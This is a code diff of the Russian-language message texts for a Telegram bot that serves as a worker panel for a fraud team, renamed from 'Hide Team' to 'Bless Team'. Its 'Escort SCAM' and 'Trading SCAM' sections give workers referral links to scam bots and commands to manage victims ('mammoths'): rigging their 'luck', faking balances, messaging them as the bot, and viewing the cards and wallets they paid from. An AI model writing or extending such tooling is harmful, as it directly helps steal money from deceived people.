@@ -1,11 +1,6 @@
 from aiogram.utils.emoji import emojize
 
 
-"""
-    Hide Panel
-
-"""
-
 worker_menu_text = emojize(
     ":woman_tipping_hand: <b>Твой профиль</b>\n\n"
     ":rocket: Telegram ID: <b>{chat_id}</b>\n"
@@ -20,7 +15,7 @@ worker_menu_text = emojize(
 )
 
 about_project_text = emojize(
-    ":woman_tipping_hand: <b>Информация о проекте Hide Team</b>\n\n"
+    ":woman_tipping_hand: <b>Информация о проекте Bless Team</b>\n\n"
     ":fire: Мы открылись: {team_start}\n"
     ":fallen_leaf: Количество профитов: {team_profits}\n"
     ":moneybag: Общая сумма профитов: {profits_sum} ₽\n"
@@ -45,9 +40,9 @@ referral_system_text = emojize(
 escort_text = emojize(
     "💝 <b>Эскорт</b> SCAM\n\n"
     "Твой код - {worker_id}\n"
-    "Скам бот - @esc_18_bot\n"
-    "Тех. поддержка - @escsup_bot\n\n"
-    "Твоя рефка - https://t.me/esc_18_bot?start={worker_id}\n"
+    "Скам бот - @prettyescortbot\n"
+    "Тех. поддержка - @escort18support\n\n"
+    "Твоя рефка - https://t.me/prettyescortbot?start={worker_id}\n"
     "Мануал - teletype.in/@xdurex/DUREX-ESCORT\n\n"
     "/info <code>[ID мамонта]</code> - инфо о мамонте\n"
     "/del <code>[ID мамонта]</code> - удалить мамонта\n"
@@ -59,9 +54,9 @@ escort_text = emojize(
 trading_text = emojize(
     "📈 <b>Трейдинг</b> SCAM\n\n"
     "Твой код - {worker_id}\n"
-    "Скам бот - @Trade_Binance_Robot\n"
-    "Тех. поддержка - @tradesup_bot\n\n"
-    "Твоя рефка Binance - https://t.me/Trade_Binance_Robot?start={worker_id}\n\n"
+    "Скам бот - @tradebinancerubot\n"
+    "Тех. поддержка - @TradeBinanceHelp\n\n"
+    "Твоя рефка Binance - https://t.me/tradebinancerubot?start={worker_id}\n\n"
     "Карты с которых вы пополняли:\n"
     "{pay_cards}\n"
     "QIWI с которых вы пополняли:\n"
@@ -72,6 +67,6 @@ trading_text = emojize(
     "/fart <code>[ID мамонта]</code> - вкл / выкл / выкл/вкл фарт мамонту\n"
     "/msg <code>[ID мамонта]</code>; <code>[Сообщение]</code> - сообщение от бота\n"
     "/bal <code>[ID мамонта];</code> <code>[Баланс]</code> - изменить баланс мамонта\n"
-    "Запрещено использовать любые ТП кроме @tradesup_bot\n"
+    "Запрещено использовать любые ТП кроме @TradeBinanceHelp\n"
     "Запрещено принимать оплату на любые реквизиты кроме наших"
 )
